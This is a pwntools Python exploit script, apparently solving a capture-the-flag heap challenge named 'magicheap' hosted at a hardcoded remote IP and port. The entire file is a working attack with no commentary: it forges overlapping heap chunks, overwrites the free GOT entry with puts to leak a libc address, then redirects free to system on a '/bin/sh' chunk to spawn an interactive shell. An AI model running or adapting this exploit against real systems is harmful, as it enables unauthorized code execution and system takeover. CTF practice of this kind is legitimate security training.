from pwn import *
import sys


Host = '35.201.132.60'
Port = 50216

if len(sys.argv) == 1:
    r = process('./magicheap', env={'LD_PRELOAD': './libc.so.6'})
else:
    r = remote(Host, Port)

def create_heap(size, content):
    r.recvuntil(':')
    r.sendline('1')
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    r.send(content)


def edit_heap(idx, size, content):
    r.recvuntil(':')
    r.sendline('2')
    r.recvuntil(':')
    r.sendline(str(idx))
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    r.send(content)

def del_heap(idx):
    r.recvuntil(':')
    r.sendline('3')
    r.recvuntil(':')
    r.sendline(str(idx))

r.recvuntil('Name:')
r.sendline('1')


free_got_target = 0x602002 - 8
puts_plt = 0x4006b0
system = 0x000000000045390

create_heap(0x10, 'A') # 0
create_heap(0x1a0, '\x00'*0x180 + p64(0x190)) # 1
create_heap(0x80, 'A') # 2
create_heap(0x20, 'A') # 3



del_heap(1)
edit_heap(0, 0x20,'\x00'*0x18 + p64(0x191))
create_heap(0x80, 'A') # 1
create_heap(0x50, 'A') # 4
create_heap(0x40, 'A') # 5

del_heap(1)
del_heap(2)

create_heap(0x80, 'A') # 1
create_heap(0x50, 'A') # 2 overlap with 4
create_heap(0x80, 'A') # 6 overlap with 5

del_heap(2)
edit_heap(4, 0x8, p64(free_got_target)) 

create_heap(0xb0, '/bin/sh\x00') #2 remove unsorted bin
del_heap(6) 

create_heap(0x50, 'A') # 6
create_heap(0x50, '\x00'*0xe + p64(puts_plt)) # 7


del_heap(5)
libc = u64(r.recvuntil('\n').strip().ljust(8, '\x00')) - 0x3c4b78
log.info('libc: '+ hex(libc))

edit_heap(7, 0x20, '\x00'*0xe + p64(libc+system) + '\x00'*0x8)
del_heap(2)

r.interactive()
